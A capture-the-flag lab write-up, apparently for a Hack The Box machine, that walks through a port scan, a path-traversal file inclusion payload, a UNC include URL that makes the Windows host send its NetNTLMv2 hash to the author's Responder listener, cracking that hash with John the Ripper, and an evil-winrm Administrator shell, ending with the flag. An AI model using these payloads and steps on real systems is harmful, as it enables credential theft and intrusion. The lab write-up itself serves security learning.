Nmap scanning:
~~~
nmap 10.129.33.185 -sC -sV
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-13 14:27 EDT
Nmap scan report for 10.129.33.185
Host is up (0.35s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.15 seconds
~~~

~~~
nano /etc/hosts
~~~

![[hosts.png]]


after the testing in the website we find that the webpage is vulnerable to file inclusion vuln

windows default host path 

~~~
../../../../..\Windows\System32\Drivers\etc\hosts
~~~


![[windowspath.png]]


include methos is responsible for file inclusion because .in this method is being process the url parameter of the page and serving the different page for the different languages 
and this method take the text code in the specified and loads it into the memory 

so we use the smb(sever message blocker) to send the malicious file to host and  the windows will try to authenticate to our machine and we can capture the NEtNTLMV2

NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response  
authentication protocol used to authenticate a client to a resource on an Active Directory domain


we responder tool for capture the credentials 

![[responder.png]]


~~~
http://unika.htb/index.php?page=//10.10.14.122/12345.txt
~~~


![[lfi 1.png]]


decrypt the hash with john the ripper

~~~
john -w=/home/subhash/Downloads/rockyou.txt hask.txt
~~~~

~~~
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2023-06-14 12:22) 50.00g/s 204800p/s 204800c/s 204800C/s adriano..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
~~~~


after get the username and password for the ip address we try to get the shell with the evil-winrm

~~~
evil-winrm -i 10.129.33.185 -u Administator -p badminton
~~~~

![[evil-wnrm.jpeg]]


![[flag.jpeg]]

flag ea81b7afddd03efaa8945333ed147fac

finally got the flag!!!!!

